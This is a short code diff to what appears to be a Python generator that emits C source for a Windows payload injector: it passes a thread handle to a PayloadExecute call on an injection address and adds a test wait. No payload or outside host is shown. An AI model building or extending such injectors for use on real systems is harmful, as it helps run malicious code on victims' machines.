@@ -49,6 +49,9 @@ int main()
     HANDLE hProcess;
     PBYTE InjectionAddress;
     HANDLE hThread;
+    HANDLE* phThread = &hThread;
+
+    hThread = GetCurrentThread();
     """)
 
     if Payload != "null":
@@ -90,11 +93,13 @@ int main()
 """)
 
     f.write(f"""\n
-    if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, &hThread)){{
+    if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, phThread)){{
         printf("Failed to execute payload");
         return 0;
     }}
-            
+   
+    // Just for testing purposes (TO REMOVE)
+	WaitForSingleObject(*phThread, INFINITE);
     return 0;
 }}
 """)
